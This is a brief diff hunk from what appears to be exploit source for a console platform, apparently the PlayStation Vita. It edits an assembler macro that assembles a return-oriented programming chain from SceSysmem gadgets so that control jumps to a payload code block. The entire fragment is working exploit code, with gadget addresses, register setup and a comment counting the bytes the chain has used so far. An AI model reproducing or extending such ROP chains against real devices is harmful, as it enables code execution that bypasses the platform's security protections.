@@ -90,11 +90,9 @@
   push 2, payload_code_block                           // r0
   push 1, 0                                            // r1
   push 0, framebuf                                     // r2
-  push 1, SceSysmem_blx_r4_pop_r4_pc                   // r3
-  push 1, SceSysmem_adds_r0_1_bx_lr                    // r4
-  push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
+  push 1, SceSysmem_blx_r0                             // r3
   push 9, 0xDEADBEEF                                   // r4
-  push 1, SceSysmem_blx_r0                             // pc
+  push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
 .endm
 
 // 0x1C is how many bytes the ROP chain has used so far.
